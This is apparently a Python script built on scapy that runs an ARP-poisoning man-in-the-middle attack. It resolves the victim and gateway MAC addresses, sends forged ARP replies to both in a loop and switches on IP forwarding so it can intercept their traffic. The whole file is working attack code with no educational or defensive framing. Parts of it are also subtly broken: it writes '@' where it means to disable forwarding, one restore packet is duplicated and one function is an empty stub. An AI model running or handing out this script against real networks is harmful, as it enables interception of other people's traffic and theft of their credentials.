#! /usr/bin/python

import sys
import os
import time
from scapy.all import *
import subprocess
import random


class bcolors:
    HEADER='\033[95m'
    OKBLUE='\033[94m'
    OKGREEN='\033[92m'
    WARNING='\033[93m'
    FAIL='\033[91m'
    ENDC='\033[0m'
    BOLD='\033[95m'
    UNDERLINE='\033[95m'


interactive=False


def get_gateway_ip():
    print(bcolors.OKBLUE + "[mitm][*] Getting gateway IP address..." + bcolors.ENDC)
    m=sr1(IP(dst="www.google.fr", ttl=0)/ICMP()/"XXXXXXXXXX", verbose=False)
    _gateIP=m.src
    print(bcolors.OKGREEN + "[mitm][*] Gateway IP address is {add}\n".format(add=_gateIP) + bcolors.ENDC)
    return _gateIP


def get_all_target_IPs():
    pass
    

def get_mac(IP, interface):
    conf.verb = 0
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def reARP(victimIP, gateIP, interface):
    print(bcolors.OKBLUE + "\n[mitm][*] Restoring targets..." + bcolors.ENDC)
    victimMAC = get_mac(victimIP, interface)
    gateMAC = get_mac(gateIP, interface)
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=7)
    print(bcolors.OKBLUE + "[mitm][*] Disabling IP forwarding..." + bcolors.ENDC)
    os.system("echo @ > /proc/sys/net/ipv4/ip_forward")
    print(bcolors.OKBLUE + "[mitm][*] Shutting down..." + bcolors.ENDC)
    return


def trick(gateMAC, victimMAC, victimIP, gateIP):
    send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst=victimMAC))
    send(ARP(op=2, pdst=gateIP, psrc=victimIP, hwdst=gateMAC))

    
def poison(victimMAC, victimIP, gateIP):
    print("[mitm][*] poisoning target")
    while True:
        try:
            send(ARP(op=2, pdst=victimIP, psrc=gateIP, hwdst=victimMAC))
            time.sleep(0.1)
        except KeyboardInterrupt:
            print("[mitm][!] user interrupted")
            print("[mitm][!] exiting...")
            sys.exit(1)


def mitm(interface, victimIP, gateIP):
    try:
        victimMAC = get_mac(victimIP, interface)
        if victimMAC == None:
            os.system("echo @ > /proc/sys/net/ipv4/ip_forward")
            print(bcolors.FAIL + "[mitm][!] Couldn't find victim MAC address" + bcolors.ENDC)
            print(bcolors.FAIL + "[mitm][!] Exiting..." + bcolors.ENDC)
            sys.exit(1)
        print(bcolors.OKGREEN + "[mitm][*] Got victim's MAC address : {mac}".format(mac=victimMAC) + bcolors.ENDC)
    except Exception:
        os.system("echo @ > /proc/sys/net/ipv4/ip_forward")
        print(bcolors.FAIL + "[mitm][!] Couldn't find victim MAC address" + bcolors.ENDC)
        print(bcolors.FAIL + "[mitm][!] Exiting..." + bcolors.ENDC)
        sys.exit(1)
    try:
        gateMAC = get_mac(gateIP, interface)
        if gateMAC == None:
            os.system("echo @ > /proc/sys/net/ipv4/ip_forward")
            print(bcolors.FAIL + "[mitm][!] Couldn't find victim MAC address" + bcolors.ENDC)
            print(bcolors.FAIL + "[mitm][!] Exiting..." + bcolors.ENDC)
            return
        print(bcolors.OKGREEN + "[mitm][*] Got gate's MAC address : {mac}".format(mac=gateMAC) + bcolors.ENDC)
    except Exception:
        os.system("echo @ > /proc/sys/net/ipv4/ip_forward")
        print(bcolors.FAIL + "[mitm][!] Couldn't find gateway MAC address" + bcolors.ENDC)
        print(bcolors.FAIL + "[mitm][!] Exiting..." + bcolors.ENDC)
        return
    print(bcolors.OKBLUE + "[mitm][*] Poisoning targets..." + bcolors.ENDC)
    while 1:
        try:
            trick(gateMAC, victimMAC, victimIP, gateIP)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP(victimIP, gateIP, interface)
            break


def init(ip_forwarding_enabling):
    print(bcolors.BOLD + "==============================================================" + bcolors.ENDC)
    print(bcolors.BOLD + "=================== Man in the middle attack =================" + bcolors.ENDC)

    if ip_forwarding_enabling == True:
        print(bcolors.OKBLUE + "\n[mitm][*] Enabling IP forwarding...\n" + bcolors.ENDC)
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

if __name__ == "__main__":
    ip="192.168.1.2"
    interface="wlan0"
    print(get_mac(ip, interface))
